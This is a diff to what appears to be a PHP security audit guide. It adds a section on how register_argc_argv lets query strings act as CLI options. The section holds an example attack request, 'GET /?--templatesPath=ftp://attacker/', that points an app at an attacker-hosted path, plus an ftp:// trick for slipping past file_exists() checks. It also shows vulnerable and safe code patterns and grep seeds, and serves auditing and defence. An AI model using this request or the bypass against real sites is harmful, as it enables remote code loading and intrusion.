@@ -324,6 +324,14 @@ $this->db->query("SELECT * FROM users WHERE id = ?", [$this->input->get('id')]);
 | `magic_quotes_gpc` | off + no escaping | SQL injection facilitated |
 | `session.use_strict_mode` | `0` | Session fixation attacks |
 | `disable_functions` | missing exec/system | OS command execution enabled |
+| `register_argc_argv` | `On` (the default) | **Query string becomes `$_SERVER['argv']` on web requests** — see footgun below |
+
+### `register_argc_argv` — query string masquerades as CLI argv (web-reachable `$argv`)
+
+With `register_argc_argv=On` (PHP's **default**), a normal HTTP request populates `$argc`/`$argv`/`$_SERVER['argv']` **from the query string**, tokenized on `+`/space — not just CLI invocations. So any code that reads `$_SERVER['argv']` (or `$argv`, or a `getopt()`-style parser) **assuming it only runs under the CLI**, without a `PHP_SAPI === 'cli'` (or `php_sapi_name() === 'cli'`) guard, is actually parsing **attacker-controlled query data** on the web SAPI. This turns request params into CLI-style **options**: a bootstrap/config loader that resolves `--basePath`/`--configPath`/`--templatesPath`/`--dotenvPath` from `argv` lets `GET /?--templatesPath=ftp://attacker/` (or `--configPath=...`) redirect the app to load config/templates/vendor code from an attacker path → LFI/RFI/SSTI/RCE. (Aggravating trick: the **`ftp://` stream wrapper implements `file_exists()`** where `http://`/`php://filter` do not, so an `ftp://` override slips past a defensive "does this path exist?" check that would reject a plain remote URL.)
+- **VULN**: `if (!empty($_SERVER['argv'])) { $opts = parseOptions($_SERVER['argv']); }` reached on a web request; `App::cliOption('--configPath')` / any `$argv`-driven path or flag resolution with no SAPI check.
+- **SAFE**: gate every `$argv`/`$_SERVER['argv']`/`getopt()` read on `PHP_SAPI === 'cli'`, or set `register_argc_argv=Off` for web SAPIs.
+- **Grep seeds**: `\$_SERVER\['argv'\]`, `\bgetopt\s*\(`, `\$argv\b`, `register_argc_argv` — then check for a nearby `PHP_SAPI`/`php_sapi_name()` guard; flag its absence in web-reachable code. (Related known gadget: `pearcmd.php` interpreting the query string as argv — see `path_traversal_lfi_rfi.md`.)
 
 ## PHP Superglobal Sources
 
